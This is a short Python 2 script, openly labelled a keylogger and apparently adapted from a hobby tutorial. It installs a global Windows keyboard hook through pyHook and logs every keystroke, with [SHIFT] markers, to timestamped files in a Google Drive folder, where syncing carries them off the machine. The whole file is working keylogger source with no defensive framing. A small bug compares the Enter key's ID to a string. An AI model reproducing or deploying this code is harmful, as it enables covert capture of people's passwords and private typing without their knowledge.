#Gaines keylogger
#Framework based off Tinkernut YouTube channel
#Includes modification for inline text
#21JUL2017
#extra modules stored in C:\python27\DownMODS
#use python -m pip install <filepath/filename>.whl to install MODS
#pywin32 (pythoncom) dlls from python27/Lib/site-packages/pywin32_system32 had to be copied to win/lib folder for MOD to work

import sys, logging, pyHook, pythoncom, datetime
from datetime import datetime

logName = datetime.now().strftime('%Y-%m-%d %H%M')
file_log = 'C:\\Users\\cgain\\Google Drive\\Logs\\' + logName + '.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, filemode='wb+', level=logging.DEBUG, format='%(message)s')
    #store Ascii event as character
    keyPress = chr(event.Ascii)

    #if event is the enter buttton, start new log line
    Keyid = event.KeyID
    if (Keyid == '13'):
        logging.log(10,'\n')
    #if event it shift key print [SHIFT] to log
    elif (Keyid == 161):
        shift = '[SHIFT]'
        logging.log(10,shift)
    #or just print normal key stroke
    else:
        logging.log(10,keyPress)
    #Keyid1 = 'KeyID: ', event.KeyID
    #logging.log(10,Keyid1)
    #Keyid2 = 'MessageName:',event.MessageName
    #Keyid3 = 'Message:',event.Message
    #Keyid4 = 'Time:',event.Time
    #Keyid5 = 'Window:',event.Window
    #Keyid6 = 'WindowName:',event.WindowName
    #Keyid7 = 'Ascii:', event.Ascii
    #Keyid8 = 'Key:', event.Key
    #Keyid9 = 'ScanCode:', event.ScanCode
    #Keyid0 = 'Extended:', event.Extended
    #Keyid11 = 'Injected:', event.Injected
    #Keyid12 = 'Alt', event.Alt
    #Keyid13 = 'Transition', event.Transition

    #logging.log(10,Keyid1)
    #logging.log(10,Keyid2)
    #logging.log(10,Keyid3)
    #logging.log(10,Keyid4)
    #logging.log(10,Keyid5)
    #logging.log(10,Keyid6)
    #logging.log(10,Keyid7)
    #logging.log(10,Keyid8)
    #logging.log(10,Keyid9)
    #logging.log(10,Keyid0)
    #logging.log(10,Keyid11)
    #logging.log(10,Keyid12)
    #logging.log(10,Keyid13)
    return True
    
hooks_manager = pyHook.HookManager() #Creates Hook Manager
hooks_manager.KeyDown = OnKeyboardEvent #Watches for Keypress, calls on OnKeyboardEvent Function
hooks_manager.HookKeyboard() #Set the hook
pythoncom.PumpMessages() #wait for event

